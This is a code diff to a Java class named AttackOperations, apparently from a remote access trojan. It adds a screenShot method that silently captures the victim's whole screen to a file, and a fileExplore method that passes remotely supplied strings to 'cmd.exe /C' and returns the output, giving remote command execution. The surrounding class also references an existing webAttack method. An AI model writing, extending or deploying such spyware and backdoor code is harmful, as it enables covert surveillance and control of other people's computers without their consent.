@@ -1,6 +1,14 @@
+import java.io.BufferedReader;
+import java.io.File;
 import java.io.FileOutputStream;
+import java.io.InputStreamReader;
 
+import javax.imageio.ImageIO;
+
+import java.awt.*;
+import java.awt.image.BufferedImage;
 public class AttackOperations {
+	public static String filePath = "";
 	
 	public static String webAttack(String recive){
 		try{
@@ -75,7 +83,68 @@ public class AttackOperations {
 		}catch(Exception e){
 			return "failed !";
 		
+		}
 	}
+	
+	
+	public static String screenShot(String path){
+		try { 
+			
+			System.out.println(path);
+			
+			Robot r = new Robot(); 
+			Rectangle capture = 
+			new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()); 
+			BufferedImage Image = r.createScreenCapture(capture); 
+			ImageIO.write(Image, "jpg", new File(path)); 
+			
+		    return "sucessfully screenshot captured"; 
+        } 
+        catch (Exception e) { 
+            return "failed.";
+        } 
+	}
+	
+	public static String fileExplore(String path){
+		try{
+			filePath+=path+" ";
+			if(path.equals("undo")) {
+				filePath = "";
+				ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/C" , "echo done");
+	            builder.redirectErrorStream(true);
+	            Process p = builder.start();
+	            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+	            String line,ans="";
+	            while (true) {
+	                line = r.readLine();
+	                if (line == null) { break; }
+	                ans+=line;
+	                ans+="\n";
+	            }
+	            
+	            return ans;
+			}
+			else {
+				ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/C" , filePath);
+	            builder.redirectErrorStream(true);
+	            Process p = builder.start();
+	            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+	            String line,ans="";
+	            while (true) {
+	                line = r.readLine();
+	                if (line == null) { break; }
+	                ans+=line;
+	                ans+="\n";
+	            }
+	            
+	            return ans;
+			}
+
+            
+        }catch(Exception e) {
+        	
+        	return "failed..";
+		}
 	}
 		
 	
